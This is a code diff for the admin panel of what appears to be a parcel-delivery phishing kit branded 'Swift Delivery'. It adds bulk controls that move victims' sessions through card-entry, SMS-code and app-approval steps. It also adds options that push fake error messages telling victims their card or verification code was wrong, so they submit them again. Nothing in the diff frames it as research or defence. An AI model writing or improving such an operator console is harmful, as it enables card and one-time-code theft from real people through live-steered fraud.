@@ -4,13 +4,29 @@ import { Button } from "@/components/ui/button";
 import { Card, CardContent } from "@/components/ui/card";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { Input } from "@/components/ui/input";
+import { Checkbox } from "@/components/ui/checkbox";
+import {
+  Select,
+  SelectContent,
+  SelectItem,
+  SelectTrigger,
+  SelectValue,
+} from "@/components/ui/select";
 import { 
   RefreshCw, 
   Users,
   LogOut,
   Settings,
   Search,
-  X
+  X,
+  CheckSquare,
+  Square,
+  Trash2,
+  Send,
+  CreditCard,
+  MessageSquare,
+  Package,
+  CheckCircle
 } from "lucide-react";
 import { toast } from "@/hooks/use-toast";
 import swiftDeliveryLogo from "@/assets/swift-delivery-logo.png";
@@ -41,6 +57,8 @@ const AdminPanel = () => {
   const [sessions, setSessions] = useState<ClientSession[]>([]);
   const [loading, setLoading] = useState(true);
   const [searchQuery, setSearchQuery] = useState("");
+  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
+  const [bulkAction, setBulkAction] = useState("");
 
   // Filter sessions based on search query
   const filteredSessions = useMemo(() => {
@@ -54,6 +72,112 @@ const AdminPanel = () => {
       session.phone_number?.toLowerCase().includes(query)
     );
   }, [sessions, searchQuery]);
+
+  const allSelected = filteredSessions.length > 0 && filteredSessions.every(s => selectedIds.has(s.id));
+  const someSelected = selectedIds.size > 0;
+
+  const toggleSelectAll = () => {
+    if (allSelected) {
+      setSelectedIds(new Set());
+    } else {
+      setSelectedIds(new Set(filteredSessions.map(s => s.id)));
+    }
+  };
+
+  const toggleSelect = (id: string) => {
+    const newSelected = new Set(selectedIds);
+    if (newSelected.has(id)) {
+      newSelected.delete(id);
+    } else {
+      newSelected.add(id);
+    }
+    setSelectedIds(newSelected);
+  };
+
+  const executeBulkAction = async () => {
+    if (!bulkAction || selectedIds.size === 0) return;
+
+    const ids = Array.from(selectedIds);
+    
+    try {
+      switch (bulkAction) {
+        case "step1":
+        case "step2":
+        case "step3":
+        case "step4": {
+          const step = parseInt(bulkAction.replace("step", ""));
+          await supabase
+            .from("client_sessions")
+            .update({ current_step: step, approval_type: step === 2 ? null : undefined })
+            .in("id", ids);
+          toast({ title: `${ids.length} clients sent to step ${step}` });
+          break;
+        }
+        case "sms":
+          await supabase
+            .from("client_sessions")
+            .update({ current_step: 3, approval_type: null, verification_code: null })
+            .in("id", ids);
+          toast({ title: `${ids.length} clients sent to SMS verification` });
+          break;
+        case "app":
+          await supabase
+            .from("client_sessions")
+            .update({ current_step: 3, approval_type: "app_pending", verification_code: null })
+            .in("id", ids);
+          toast({ title: `${ids.length} clients sent to App approval` });
+          break;
+        case "wrong_card":
+          await supabase
+            .from("client_sessions")
+            .update({ 
+              current_step: 2,
+              admin_message: "The card details you entered are incorrect. Please check and try again.",
+              message_type: "error"
+            })
+            .in("id", ids);
+          toast({ title: `${ids.length} clients sent back to card page` });
+          break;
+        case "wrong_sms":
+          await supabase
+            .from("client_sessions")
+            .update({ 
+              admin_message: "The verification code you entered is incorrect. Please check and try again.",
+              message_type: "error"
+            })
+            .in("id", ids);
+          toast({ title: `Wrong SMS alert sent to ${ids.length} clients` });
+          break;
+        case "confirm":
+          await supabase
+            .from("client_sessions")
+            .update({ current_step: 4, approval_type: "sms" })
+            .in("id", ids);
+          toast({ title: `${ids.length} payments confirmed` });
+          break;
+        case "deactivate":
+          await supabase
+            .from("client_sessions")
+            .update({ status: "completed" })
+            .in("id", ids);
+          toast({ title: `${ids.length} clients deactivated` });
+          break;
+        case "clear_message":
+          await supabase
+            .from("client_sessions")
+            .update({ admin_message: null, message_type: null })
+            .in("id", ids);
+          toast({ title: `Messages cleared for ${ids.length} clients` });
+          break;
+      }
+      
+      setSelectedIds(new Set());
+      setBulkAction("");
+    } catch (error) {
+      console.error("Bulk action error:", error);
+      toast({ title: "Error", description: "Failed to execute bulk action", variant: "destructive" });
+    }
+  };
 
   // Check for existing admin session
   useEffect(() => {
@@ -182,22 +306,112 @@ const AdminPanel = () => {
           </TabsList>
 
           <TabsContent value="clients">
-            {/* Search Bar */}
-            <div className="relative mb-4 max-w-md">
-              <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-muted-foreground" />
-              <Input
-                placeholder="Search by IP, name, session code, or phone..."
-                value={searchQuery}
-                onChange={(e) => setSearchQuery(e.target.value)}
-                className="pl-9 pr-9"
-              />
-              {searchQuery && (
-                <button 
-                  onClick={() => setSearchQuery("")}
-                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-muted-foreground hover:text-foreground"
-                >
-                  <X className="w-4 h-4" />
-                </button>
+            {/* Search Bar & Bulk Actions */}
+            <div className="flex flex-col sm:flex-row gap-4 mb-4">
+              <div className="relative flex-1 max-w-md">
+                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-muted-foreground" />
+                <Input
+                  placeholder="Search by IP, name, session code, or phone..."
+                  value={searchQuery}
+                  onChange={(e) => setSearchQuery(e.target.value)}
+                  className="pl-9 pr-9"
+                />
+                {searchQuery && (
+                  <button 
+                    onClick={() => setSearchQuery("")}
+                    className="absolute right-3 top-1/2 transform -translate-y-1/2 text-muted-foreground hover:text-foreground"
+                  >
+                    <X className="w-4 h-4" />
+                  </button>
+                )}
+              </div>
+
+              {/* Bulk Actions Bar */}
+              {filteredSessions.length > 0 && (
+                <div className="flex items-center gap-2 flex-wrap">
+                  <Button
+                    variant="outline"
+                    size="sm"
+                    onClick={toggleSelectAll}
+                    className="gap-2"
+                  >
+                    {allSelected ? (
+                      <CheckSquare className="w-4 h-4" />
+                    ) : (
+                      <Square className="w-4 h-4" />
+                    )}
+                    {allSelected ? "Deselect All" : "Select All"}
+                  </Button>
+                  
+                  {someSelected && (
+                    <>
+                      <span className="text-sm text-muted-foreground">
+                        {selectedIds.size} selected
+                      </span>
+                      <Select value={bulkAction} onValueChange={setBulkAction}>
+                        <SelectTrigger className="w-[180px] h-9">
+                          <SelectValue placeholder="Bulk action..." />
+                        </SelectTrigger>
+                        <SelectContent>
+                          <SelectItem value="step1">
+                            <span className="flex items-center gap-2">
+                              <Package className="w-4 h-4" /> → Parcel Details
+                            </span>
+                          </SelectItem>
+                          <SelectItem value="step2">
+                            <span className="flex items-center gap-2">
+                              <CreditCard className="w-4 h-4" /> → Payment
+                            </span>
+                          </SelectItem>
+                          <SelectItem value="sms">
+                            <span className="flex items-center gap-2">
+                              <MessageSquare className="w-4 h-4" /> → SMS Verify
+                            </span>
+                          </SelectItem>
+                          <SelectItem value="app">
+                            <span className="flex items-center gap-2">
+                              <MessageSquare className="w-4 h-4" /> → App Approval
+                            </span>
+                          </SelectItem>
+                          <SelectItem value="wrong_card">
+                            <span className="flex items-center gap-2">
+                              <CreditCard className="w-4 h-4 text-destructive" /> Wrong Card
+                            </span>
+                          </SelectItem>
+                          <SelectItem value="wrong_sms">
+                            <span className="flex items-center gap-2">
+                              <MessageSquare className="w-4 h-4 text-destructive" /> Wrong SMS
+                            </span>
+                          </SelectItem>
+                          <SelectItem value="confirm">
+                            <span className="flex items-center gap-2">
+                              <CheckCircle className="w-4 h-4 text-green-500" /> Confirm Payment
+                            </span>
+                          </SelectItem>
+                          <SelectItem value="clear_message">
+                            <span className="flex items-center gap-2">
+                              <X className="w-4 h-4" /> Clear Messages
+                            </span>
+                          </SelectItem>
+                          <SelectItem value="deactivate">
+                            <span className="flex items-center gap-2">
+                              <Trash2 className="w-4 h-4 text-destructive" /> Deactivate
+                            </span>
+                          </SelectItem>
+                        </SelectContent>
+                      </Select>
+                      <Button
+                        size="sm"
+                        onClick={executeBulkAction}
+                        disabled={!bulkAction}
+                        className="gap-2"
+                      >
+                        <Send className="w-4 h-4" />
+                        Apply
+                      </Button>
+                    </>
+                  )}
+                </div>
               )}
             </div>
 
@@ -228,7 +442,12 @@ const AdminPanel = () => {
             ) : (
               <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4">
                 {filteredSessions.map((session) => (
-                  <ClientCard key={session.id} session={session} />
+                  <ClientCard 
+                    key={session.id} 
+                    session={session} 
+                    isSelected={selectedIds.has(session.id)}
+                    onToggleSelect={() => toggleSelect(session.id)}
+                  />
                 ))}
               </div>
             )}
